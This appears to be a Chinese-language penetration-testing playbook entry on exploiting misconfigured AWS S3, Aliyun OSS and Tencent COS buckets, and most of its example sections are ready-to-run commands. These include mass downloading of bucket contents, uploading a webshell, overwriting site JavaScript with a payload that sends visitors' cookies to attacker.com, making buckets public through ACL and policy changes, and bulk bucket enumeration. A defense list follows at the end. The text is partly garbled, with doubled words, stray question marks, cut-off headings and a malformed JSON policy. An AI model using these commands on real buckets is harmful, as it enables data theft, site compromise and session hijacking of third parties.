# S3/OSS Bucket Misconfiguration Exploitation

**ID**: `cloud-s3-001` | **分类**: cloud | **风险等级**: critical

云存储桶（S3/OSS/COS）配置错误是最常见的云安全问题之一。当 bucket 的 ACL 和ACL ?bucket policy 被错误配置为公开读写时，攻击者可以直接枚举、下载、上传甚至删除 bucket 中的所有对象。更严重的场景是，攻击者利用可写 bucket 覆盖应用的关键文件（如 JSJS 文件、配置文件）实现供应链攻击，或上传恶意文件通过应用处理链触发 RCE。在阿里云 OSS 中，"公共读/公共读写"权限制bucket 可以通过 ossutil 工具直接操作，危害极大。此外，CloudFront Origin Access Identity (OAI) 配置错误可导致 bucket 虽然设置了 OAI 限制但仍可通过 S3 直接端点公开访问

## 触发场景

- 目标使用 AWS S3、阿里云 OSS、腾讯云 COS 等云存储服务作为静态资源托管
- Web 应用从云存储桶加载前端资源（JS/CSS/图片），URL 中包含 bucket 名称
- 应用允许用户上传文件到云存储桶，且未严格校验上传路径和文件类型
- 发现 bucket 域名格式:{bucket}.s3.amazonaws.com、{bucket}.oss-cn-hangzhou.aliyuncs.com
- 前端代码硬编码了 S3/OSS bucket URL 或使用了 SDK 直传
- CloudFront/OSS CDN 回源到S3/OSS bucket，可能存在 OAI 绕过
- CI/CD 流水线将构建产物或配置文件上传到云存储桶

## 操作检查清单

1. 从应用前端源码、JS 文件、网络请求中提取 bucket 名称和区域信
2. 通过 DNS 枚举确认 bucket 是否存在（{name}.s3.amazonaws.com
3. 测试 bucket 读取权限：访问 https://{bucket}.s3.{region}.amazonaws.com/
4. 测试 bucket 列举权限：访问 https://{bucket}.s3.amazonaws.com/?list-type=2
5. 如果返回文件列表，分析文件类型和内容，寻找敏感数据
6. 测试 bucket 写入权限：使用 PUT 上传测试文件验证是否可写
7. 检查 bucket ACL：aws s3api get-bucket-acl --bucket {bucket}
8. 检查 bucket policy：aws s3api get-bucket-policy --bucket {bucket}
9. 检查 CloudFront Distribution 是否回源到此 bucket，尝试 OAI 绕过
10. 测试 CORS 配置：aws s3api get-bucket-cors --bucket {bucket}
11. 寻找敏感文件：配置文件（.env, config.json）、密钥文件、数据库备份、日志文件
12. 如果 bucket 可写，考虑覆盖关键 JS 文件实现 XSS 或上传恶意文件
13. 测试阿里云 OSS：使用 ossutil ls oss://{bucket}/ 检查访问权限

## 技术手段

- DNS 枚举发现 S3 bucket：使用工具如 slurp、s3scanner、BucketFinder
- S3 列举绕过：当 ListBucket 被拒时，通过已知文件名模式猜测对象路径
- ACL 直接修改：当有 PutBucketAcl 权限时，可修改 bucket 为公开访问
- bucket policy 注入：当有 PutBucketPolicy 权限时，可添加允许自己的策略
- CloudFront OAI 绕过：直接通过 S3 端点访问绕过 CloudFront 的 OAIOAI 限制
- 签名 URL 伪造：如果获取到签名算法参数，可自行生成有效签名 URL
- STS 凭证滥用：利用泄露的 STS 临时凭证操作 bucket
- 预签名 URL 上传：利用服务端生成的预签名 URL 直接上传文件到 bucket
- 子域名接管：删除 bucket 后如果 Route53 记录未删除，可注册同名 bucket 接管流量
- 阿里云 OSS 公共 bucket 直接下载：ossutil cp oss://{bucket}/path/to/file ./local

## 症状

- 访问 https://{bucket}.s3.amazonaws.com/ ?https://{bucket}.oss-{region}.aliyuncs.com/ 返回 XML 格式的文件列表
- curl PUT 请求可以成功上传文件到 bucket 任意路径
- bucket 名称在 DNS 中可解析（S3 bucket 名称全局唯一，可通过 DNS 探测是否存在
- 前端 JS 源码中包含 S3/OSS ?AccessKey 或签名 URL 生成逻辑
- CORS 配置过于宽松，允许任意域读取 bucket 内容
- bucket 策略中包含 "Principal": "*" 且 Action 包含 s3:GetObject ?s3:PutObject

## 根因分析

- 开发者创建 bucket 时误设为 "Public Read/Write" 或 "Public Access" 以方便开发调试，上线后未收回权限
- 使用 AWS 管理控制台创建 bucket 时默认 ACL 策略不当（2023 年 4 月前 S3 默认关闭公共访问，但已有 bucket 不受影响
- bucket policy 中错误地设置了宽松的 Condition 条件，导致权限控制形同虚设
- 使用第三方工具（如s3cmd、aws-cli）配置 bucket 时参数错误
- 阿里云 OSS "Block Public Access" 功能未启用，bucket ACL 默认private 但被手动改为 public-read
- CloudFront OAI 配置后未移除 S3 bucket 上的 public read 权限，导致 OAI 绕过
- IAM 策略s3:* 权限过宽，允许任意IAM 用户修改 bucket policy ?ACL
- 对象标签 (object tagging) 或基于标签的访问控制配置错误

## 示例

### S3 Bucket 公开枚举与文件下载

利用 S3 bucket 公开读取权限，列举并下载 bucket 中的所有文

```
# 1. 确认 bucket 可访问（REST API 端点）
curl https://target-bucket.s3.amazonaws.com/
# 返回 XML 格式的文件列表表示可列举

# 2. 使用 list-type=2 获取更详细的文件列表
curl "https://target-bucket.s3.amazonaws.com/?list-type=2&max-keys=1000"

# 3. 分页获取所有文件（使用 ContinuationToken）
curl "https://target-bucket.s3.amazonaws.com/?list-type=2&continuation-token={token}"

# 4. 按前缀过滤（如只查询 config/ 目录）
curl "https://target-bucket.s3.amazonaws.com/?list-type=2&prefix=config/"

# 5. 批量下载所有文件
aws s3 cp --no-sign-request s3://target-bucket/ ./downloaded/ --recursive

# 6. 使用 s5cmd 工具加速下载
s5cmd --no-sign-request cp "s3://target-bucket/*" ./downloaded/
```

### S3 Bucket 可写测试与恶意文件上

测试 S3 bucket 是否可写，并上传恶意文件进行验证

```
# 1. 测试 PUT 请求上传文件
curl -X PUT -d "test content" \
  -H "Host: target-bucket.s3.amazonaws.com" \
  https://target-bucket.s3.amazonaws.com/test-write.txt

# 2. 确认文件已上传成功
curl https://target-bucket.s3.amazonaws.com/test-write.txt

# 3. 使用 AWS CLI 上传（如果配置了凭证）
aws s3 cp malicious.js s3://target-bucket/static/js/main.js --acl public-read

# 4. 上传 webshell 到网站托管 bucket
aws s3 cp shell.php s3://target-bucket/shell.php --acl public-read

# 5. 覆盖前端 JS 实现持久 XSS
echo "new Image().src=`https://attacker.com/?c=${document.cookie}`" | \
  aws s3 cp - s3://target-bucket/static/js/app.js --acl public-read --content-type "application/javascript"

# 6. 上传到阿里云 OSS（使用 ossutil）
ossutil cp malicious.txt oss://target-bucket/uploads/malicious.txt
```

### S3 Bucket ACL ?Policy 检查和修改与修改

检查 bucket 的 ACL 和ACL ?Bucket Policy 配置，并在有权限时修改为公开访问

```
# 1. 获取 Bucket ACL
aws s3api get-bucket-acl --bucket target-bucket
# 关注 Grantee URI 中是否包含 http://acs.amazonaws.com/groups/global/AllUsers

# 2. 获取 Bucket Policy
aws s3api get-bucket-policy --bucket target-bucket --output text | jq

# 3. 如果有 PutBucketAcl 权限，修改为公开读
aws s3api put-bucket-acl --bucket target-bucket \
  --acl public-read

# 4. 如果有 PutBucketPolicy 权限，添加开放策略
aws s3api put-bucket-policy --bucket target-bucket --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "PublicRead",
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::target-bucket",
      "arn:aws:s3:::target-bucket/*"
    ]
  }]
'}'

# 5. 检查 Object ACL（对象级别的 ACL 可能覆盖 bucket 策略）
aws s3api get-object-acl --bucket target-bucket --key sensitive-file.txt

# 6. 列出所有启用了公共访问的 bucket
aws s3api get-public-access-block --bucket target-bucket
```

### CloudFront OAI 绕过直接访问 S3

当应用通过 CloudFront OAI 访问私有 S3 bucket 时，尝试直接通过 S3 端点绕过 OAI 限制

```
# 1. 通过 CloudFront 域名发现 S3 bucket（查看响应头或错误信息）
curl -I https://d123456789.cloudfront.net/
# 查找 x-amz-cf-id 头或在错误页面中找到 bucket 信息

# 2. 直接访问 S3 REST 端点（绕过 CloudFront OAI）
curl https://target-bucket.s3.amazonaws.com/
curl https://target-bucket.s3.us-east-1.amazonaws.com/

# 3. 尝试 Website 端点（可能有不同的访问控制）
curl http://target-bucket.s3-website-us-east-1.amazonaws.com/

# 4. 检查 CloudFront Distribution 配置
aws cloudfront get-distribution --id EDFDVBD6EXAMPLE | jq '.Distribution.DistributionConfig.Origins'

# 5. 如果 OAI 配置为 "Restrict Bucket Access" 且 S3 bucket policy 未正确设置
#    可直接访问 S3 端点获取内容（OAI 不阻止直接 S3 访问）
#    修复方法：S3 bucket policy 中只允许特定 CloudFront OAI ?canonical user ID

# 6. 利用自定义域名和CNAME 反向查找 bucket
dig static.example.com CNAME
# 返回 d123456789.cloudfront.net. → 进一步查询 Distribution 配置
```

### 阿里云OSS 公开 Bucket 探测与利用

针对阿里云OSS 公开 bucket 的探测、列举和下载操作

```
# 1. 确认 bucket 可访问
curl https://target-bucket.oss-cn-hangzhou.aliyuncs.com/
# 返回 ListBucketResult XML 表示可公开列举

# 2. 使用 ossutil 工具列举文件
ossutil ls oss://target-bucket/ -r
ossutil ls oss://target-bucket/ --limit 1000

# 3. 批量下载 bucket 内容
ossutil cp oss://target-bucket/ ./local-dir/ --recursive --only-current-dir

# 4. 获取 bucket 配置信息（如果配置了公开读）
ossutil bucket-info oss://target-bucket
ossutil get-acl oss://target-bucket

# 5. 测试上传（如果 bucket 为公共读写）
echo "test" > test.txt
ossutil cp test.txt oss://target-bucket/test-upload.txt

# 6. 利用 STS 临时凭证访问（如果获取到）
ossutil config -e oss-cn-hangzhou.aliyuncs.com \
  -i {AccessKeyId} -k {AccessKeySecret} -t {SecurityToken}
ossutil ls oss://target-bucket/

# 7. 检查 bucket 是否开启了防勒索或版本控制
ossutil get-bucket-versioning oss://target-bucket
```

### S3 Bucket 暴力枚举与发现

通过 DNS 查询和工具批量枚举存在的 S3 bucket

```
# 1. 使用 s3scanner 工具
s3scanner scan -f bucket-names.txt
s3scanner scan --threads 50 target-bucket

# 2. 使用 slurp 枚举
slurp -d company.com -o s3-buckets.txt

# 3. 使用 DNS 直接检查（S3 bucket 名称全局唯一）
dig {bucket-name}.s3.amazonaws.com +short
# 如果返回 CNAME ?s3-1-w.amazonaws.com. ?bucket 存在

# 4. 批量 DNS 检查脚本
while read bucket; do
  result=$(dig +short "${bucket}.s3.amazonaws.com")
  if [[ "$result" == *"s3"* ]]; then
    echo "[+] Found: ${bucket}"
    # 进一步测试权限
    curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/"
  fi
done < bucket-dictionary.txt

# 5. 使用 cloud_enum 工具枚举多云存储
python3 cloud_enum.py -k company-name -t 20

# 6. 基于公司名称的常见 bucket 命名模式
# {company}-assets, {company}-prod, {company}-staging
# {company}-backup, {company}-data, {company}-logs
# {company}-frontend, {company}-uploads, {company}-media
```

### S3 Bucket 签名 URL 绕过与伪

利用预签名URL 或签名算法漏洞绕过访问控制

```
# 1. 预签名 URL 包含访问密钥和签名，直接访问可绕过 bucket 策略
# 格式: https://bucket.s3.amazonaws.com/key?AWSAccessKeyId=xxx&Signature=xxx&Expires=xxx

# 2. 如果获取到签名 URL 但已过期，可分析签名算法重新生成
# AWS Signature V4 计算:
# signing key = HMAC-SHA256("AWS4" + SecretKey, Date)
# string to sign = HTTP_METHOD + \n + URI + \n + QUERY_STRING + \n + HEADERS + \n + PAYLOAD_HASH

# 3. 使用 AWS CLI 生成预签名 URL（如果有凭证）
aws s3 presign s3://target-bucket/sensitive-file.txt --expires-in 3600

# 4. 测试签名 URL 的参数可篡改性
# 修改 Content-Type ?Content-Disposition 可能绕过下载限制
curl "https://bucket.s3.amazonaws.com/file?response-content-type=application/octet-stream"

# 5. 检查签名 URL 是否包含 versionId 参数
# 如果有，可能访问到对象的旧版本（即使当前版本已修复或删除）

# 6. 阿里云 OSS 签名 URL 格式
https://bucket.oss-cn-hangzhou.aliyuncs.com/file?OSSAccessKeyId=xxx&Signature=xxx&Expires=xxx
```

## 成功标志

- 成功列举 bucket 内所有文件和目录结构
- 成功下载 bucket 中的敏感文件（配置文件、数据库备份、密钥等），
- 成功上传文件到 bucket 并能通过 URL 访问
- 确认 bucket ACL ?policy 中存在公开访问配置
- 通过 CloudFront OAI 绕过直接访问私有S3 私有 bucket 内容
- 发现并枚举多个关联 bucket（备份、日志、开发环境等），

## 防御建议

- 启用 S3 Block Public Access（账户级别和 bucket 级别双重启用），禁止任何公开 ACL
- 遵循最小权限原则：bucket policy 中明确指定允许的 Principal、Action ?Resource
- 使用 CloudFront Origin Access Identity (OAI) ?Origin Access Control (OAC) 限制 bucket 只能通过 CDN 访问
- 配置 S3 bucket policy 中的 aws:SourceIp ?aws:SourceVpc 条件限制访问来源
- 启用 S3 版本控制和 MFA Delete 防止意外或恶意删除
- 定期使用 S3 Access Analyzer 检查 bucket 的公开访问状
- 开启 S3 Server Access Logging 和CloudTrail 数据事件监控所有 bucket 操作
- 对敏感的 bucket 启用默认加密（SSE-S3 或SSE-KMS
- 使用 IAM Access Analyzer 定期审计 bucket policy ?ACL 配置
- 阿里云 OSS：启用防勒索功能，配置 OSS 高防 IP 限制访问来源
- 禁止在客户端代码中硬编码 AccessKey，使用 STS 临时凭证或预签名 URL
- 实施 bucket 命名规范并在 CI/CD 中自动检查 bucket 权限配置
